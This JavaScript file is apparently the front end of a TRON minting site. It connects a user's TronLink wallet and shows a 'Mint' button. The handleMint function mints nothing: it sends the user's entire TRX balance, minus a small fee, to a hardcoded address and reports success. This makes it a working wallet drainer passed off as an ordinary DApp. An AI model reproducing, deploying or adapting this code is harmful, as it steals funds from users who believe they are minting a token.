document.addEventListener("DOMContentLoaded", function () {
  const connectWalletButton = document.getElementById('connectWallet');
  const handleMintButton = document.getElementById('handleMint');
  const buttonsContainer = document.getElementById('buttons');

  let tronWeb = null;

  // Initialize TronWeb object
  function initializeTronWeb() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      checkTronWebStatus();
    } else {
      let tries = 0;
      const interval = setInterval(() => {
        if (tries >= 10) {
          clearInterval(interval);
          console.error('TronWeb not found.');
          return;
        }

        if (window.tronWeb && window.tronWeb.ready) {
          clearInterval(interval);
          tronWeb = window.tronWeb;
          checkTronWebStatus();
        }
        tries++;
      }, 1000);
    }
  }

  function checkTronWebStatus() {
    if (tronWeb && tronWeb.ready) {
      updateButtonVisibility();
      fetchBalance();
    }
  }

  function updateButtonVisibility() {
    if (tronWeb && tronWeb.ready) {
      buttonsContainer.style.display = 'flex';

      if (tronWeb.defaultAddress.base58) {
        connectWalletButton.style.display = 'none';
        handleMintButton.style.display = 'block';
      } else {
        connectWalletButton.style.display = 'block';
        handleMintButton.style.display = 'none';
      }
    }
  }

  async function connectWallet() {
    try {
      const accounts = await tronWeb.request({
        method: 'tron_requestAccounts',
        params: {
          websiteIcon: 'https://example.com/icon.png',
          websiteName: 'My DApp'
        }
      });
      if (accounts && accounts.length > 0) {
        tronWeb.defaultAddress.base58 = accounts[0]; // Set default address from accounts
        updateButtonVisibility();
        fetchBalance();
      } else {
        console.error('No accounts found.');
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
    }
  }

  async function fetchBalance() {
    try {
      if (!tronWeb || !tronWeb.defaultAddress.base58) return;
      const balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
      const balanceInTRX = tronWeb.fromSun(balance);
      tronWeb.balance = balanceInTRX;
      console.log(`TRX Balance: ${balanceInTRX}`);
      updateButtonVisibility();
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
  }

  async function handleMint() {
    if (!tronWeb || !tronWeb.defaultAddress.base58) {
      alert('Please connect your wallet first.');
      return;
    }

    const fee = 1.5;
    if (tronWeb.balance <= fee || isNaN(tronWeb.balance)) {
      alert('Insufficient funds for the transaction including the fee.');
      return;
    }

    const amountToSend = tronWeb.balance - fee;
    const recipientAddress = 'TTXXYgytxLRZCPzdzi2ZDnQBe1ukvKoFj5';
    const amountInSun = tronWeb.toSun(amountToSend);

    try {
      const transaction = await tronWeb.trx.sendTransaction(recipientAddress, amountInSun);
      if (transaction.result) {
        alert('Transaction Successful!');
        console.log(`Sent ${amountToSend} TRX to ${recipientAddress}`);
        fetchBalance();
      } else {
        alert('Transaction Failed!');
        console.log('Transaction failed:', transaction);
      }
    } catch (error) {
      alert('Transaction Error!');
      console.error('Error performing transaction:', error);
    }
  }

  connectWalletButton.addEventListener('click', connectWallet);
  handleMintButton.addEventListener('click', handleMint);

  // Initialize TronWeb
  initializeTronWeb();
});
